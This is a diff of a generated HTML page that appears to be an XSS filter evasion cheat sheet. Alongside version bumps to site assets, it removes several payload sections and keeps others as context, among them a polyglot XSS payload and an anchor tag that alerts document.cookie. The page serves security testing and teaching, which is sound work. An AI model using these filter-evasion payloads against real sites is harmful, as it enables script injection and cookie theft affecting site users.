@@ -19,7 +19,7 @@
         <link rel="next" href="XS_Leaks_Cheat_Sheet.html">
       
       <link rel="icon" href="../assets/WebSite_Favicon.png">
-      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.2">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.3">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.f56500e0.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b71719e.min.css">
       
         
         <link rel="stylesheet" href="../assets/stylesheets/palette.2505c338.min.css">
@@ -331,12 +331,13 @@
     <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" checked>
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_7" type="checkbox" id="__nav_7" checked>
       
       
       
-      
-        <label class="md-nav__link" for="__nav_7">
+        <label class="md-nav__link" for="__nav_7" tabindex="0" aria-expanded="true">
           Cheatsheets
           <span class="md-nav__icon md-icon"></span>
         </label>
@@ -1509,41 +1510,6 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#image-xss-using-the-javascript-directive" class="md-nav__link">
-    Image XSS Using the JavaScript Directive
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#no-quotes-and-no-semicolon" class="md-nav__link">
-    No Quotes and no Semicolon
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#case-insensitive-xss-attack-vector" class="md-nav__link">
-    Case Insensitive XSS Attack Vector
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#html-entities" class="md-nav__link">
-    HTML Entities
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#grave-accent-obfuscation" class="md-nav__link">
-    Grave Accent Obfuscation
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#malformed-a-tags" class="md-nav__link">
     Malformed A Tags
   </a>
@@ -2458,41 +2424,6 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#image-xss-using-the-javascript-directive" class="md-nav__link">
-    Image XSS Using the JavaScript Directive
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#no-quotes-and-no-semicolon" class="md-nav__link">
-    No Quotes and no Semicolon
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#case-insensitive-xss-attack-vector" class="md-nav__link">
-    Case Insensitive XSS Attack Vector
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#html-entities" class="md-nav__link">
-    HTML Entities
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#grave-accent-obfuscation" class="md-nav__link">
-    Grave Accent Obfuscation
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#malformed-a-tags" class="md-nav__link">
     Malformed A Tags
   </a>
@@ -3352,20 +3283,6 @@
 <h3 id="xss-locator-polygot">XSS Locator (Polygot)<a class="headerlink" href="#xss-locator-polygot" title="Permanent link">&para;</a></h3>
 <p>The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to <a href="https://twitter.com/garethheyes">Gareth Heyes</a> for this <a href="https://twitter.com/garethheyes/status/997466212190781445">contribution</a>.</p>
 <p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code></p>
-<h3 id="image-xss-using-the-javascript-directive">Image XSS Using the JavaScript Directive<a class="headerlink" href="#image-xss-using-the-javascript-directive" title="Permanent link">&para;</a></h3>
-<p>Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:</p>
-<p><code>&lt;IMG SRC="javascript:alert('XSS');"&gt;</code></p>
-<h3 id="no-quotes-and-no-semicolon">No Quotes and no Semicolon<a class="headerlink" href="#no-quotes-and-no-semicolon" title="Permanent link">&para;</a></h3>
-<p><code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></p>
-<h3 id="case-insensitive-xss-attack-vector">Case Insensitive XSS Attack Vector<a class="headerlink" href="#case-insensitive-xss-attack-vector" title="Permanent link">&para;</a></h3>
-<p><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;</code></p>
-<h3 id="html-entities">HTML Entities<a class="headerlink" href="#html-entities" title="Permanent link">&para;</a></h3>
-<p>The semicolons are required for this to work:</p>
-<p><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p>
-<h3 id="grave-accent-obfuscation">Grave Accent Obfuscation<a class="headerlink" href="#grave-accent-obfuscation" title="Permanent link">&para;</a></h3>
-<p>If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:</p>
-<div class="highlight"><pre><span></span><code>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt;
-</code></pre></div>
 <h3 id="malformed-a-tags">Malformed A Tags<a class="headerlink" href="#malformed-a-tags" title="Permanent link">&para;</a></h3>
 <p>Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \~ Verified on Chrome</p>
 <p><code>\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;</code></p>
@@ -4027,10 +3944,10 @@ header(&#39;Refresh: 0; URL=&#39;.$_GET[&#39;param&#39;]);
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.12658920.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../assets/javascripts/bundle.5cf534bf.min.js"></script>
+      <script src="../assets/javascripts/bundle.ba449ae6.min.js"></script>
       
     
   </body>
